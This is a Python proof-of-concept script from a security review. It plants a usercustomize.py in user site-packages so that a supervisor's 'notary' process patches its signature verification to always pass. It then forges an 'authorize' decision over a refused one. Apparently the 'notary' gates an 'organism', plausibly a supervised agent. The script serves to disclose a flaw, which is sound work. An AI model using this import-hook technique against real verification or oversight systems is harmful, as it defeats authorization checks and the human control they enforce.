"""Review finding: notary is launched as [sys.executable, notary.py, ...] with no -I/-S/-s.
In local mode the notary runs as the same user as the organism, so a file the organism
drops into that user's site-packages (usercustomize.py) runs inside the notary BEFORE
notary.py, even when the four pinned files are byte-identical (default PINS passes).
Run as a throwaway user 'lab7tmp' so the shared 'box' account is never touched."""
import os, sys, site
root = sys.argv[1]; sys.path.insert(0, os.path.join(root, "v115")); os.chdir(os.path.join(root, "v115"))
import supervisor, session
us = site.getusersitepackages(); os.makedirs(us, exist_ok=True)
open(os.path.join(us, "usercustomize.py"), "w").write(
    "import sys, os\n"
    "if sys.argv and sys.argv[0].endswith('notary.py'):\n"
    "    import builtins; _o = builtins.__import__\n"
    "    def _h(name, *a, **k):\n"
    "        m = _o(name, *a, **k)\n"
    "        if name == 'lscs_core' or getattr(m, '__name__', '') == 'lscs_core': pass\n"
    "        return m\n"
    "    builtins.__import__ = _h\n"
    "    import importlib.util as _iu; _orig = _iu.spec_from_file_location\n"
    "    def _patched(name, path, *a, **k):\n"
    "        s = _orig(name, path, *a, **k)\n"
    "        if name == 'lscs_core':\n"
    "            L = s.loader; _ex = L.exec_module\n"
    "            def ex(mod):\n"
    "                _ex(mod); mod.MinatoAuthority.verify = lambda self, env: True\n"
    "            L.exec_module = ex\n"
    "        return s\n"
    "    _iu.spec_from_file_location = _patched\n")
print("planted", os.path.join(us, "usercustomize.py"))
cfg, mat = session.build(root)
h = supervisor.NotaryHandle(root, cfg, isolation="local")          # DEFAULT PINS -> all 4 pins match
o = supervisor.OrgClient(h.org_w, h.org_r)
print("pins verified (default supervisor.PINS), notary launched pid", h.pid)
r = o.request({"op": "commit", "submission": mat["REFUSED"]})
print("REFUSED-decision envelope (set_maturity=mature) ->", r["outcome"], r["reason"][:80])
# forge: flip decision REFUSE->AUTHORIZE (signature now invalid, but verify is patched)
import copy; f = copy.deepcopy(mat["REFUSED"]); f["auth"]["decision"] = "authorize"
f["auth"]["nonce"] = "00"*16
r = o.request({"op": "commit", "submission": f})
print("forged AUTHORIZE (bad sig) ->", r["outcome"], r["reason"][:80])
hd = h.head(); print("LEDGER: records", len(hd["records"]), "maturity", hd["state"]["maturity"], "verify_history", hd["verify_history"])
h.shutdown()
